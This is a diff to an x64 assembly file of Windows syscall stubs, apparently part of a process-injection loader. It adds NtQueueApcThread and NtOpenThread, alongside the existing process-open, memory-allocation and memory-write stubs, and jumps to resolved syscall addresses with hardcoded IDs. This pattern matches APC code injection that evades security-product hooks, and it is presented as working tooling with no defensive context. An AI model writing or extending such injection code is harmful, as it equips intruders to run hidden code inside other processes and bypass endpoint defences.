@@ -2,7 +2,8 @@ EXTERN syscallAddress_CreateThreadEx:QWORD
 EXTERN syscallAddress_AllocateVirtualMemory:QWORD
 EXTERN syscallAddress_NtOpenProcess:QWORD
 EXTERN syscallAddress_NtWriteVirtualMemory:QWORD
-EXTERN syscallAddress_NtWaitForSingleObject:QWORD
+EXTERN syscallAddress_NtQueueApcThread:QWORD
+EXTERN syscallAddress_NtOpenThread:QWORD
 
 .code
 
@@ -50,13 +51,18 @@ my_asm_NtWriteVirtualMemory proc
 	ret
 my_asm_NtWriteVirtualMemory endp
 
+my_asm_NtQueueApcThread proc
+    mov     r10, rcx        ; NtQueueApcThread
+    mov     eax, 45h
+    jmp qword ptr [syscallAddress_NtQueueApcThread]
+    ret
+my_asm_NtQueueApcThread endp
 
-
-my_asm_NtWaitForSingleObject proc
-	mov     r10, rcx        ; NtWaitForSingleObject
-	mov     eax, 4
-	jmp qword ptr [syscallAddress_NtWaitForSingleObject]
-	ret
-my_asm_NtWaitForSingleObject endp
+my_asm_NtOpenThread proc
+    mov     r10, rcx
+    mov     eax, 139h         ; syscall ID for NtOpenThread (valide sur Win10)
+    jmp     qword ptr [syscallAddress_NtOpenThread]
+    ret
+my_asm_NtOpenThread endp
 
 end
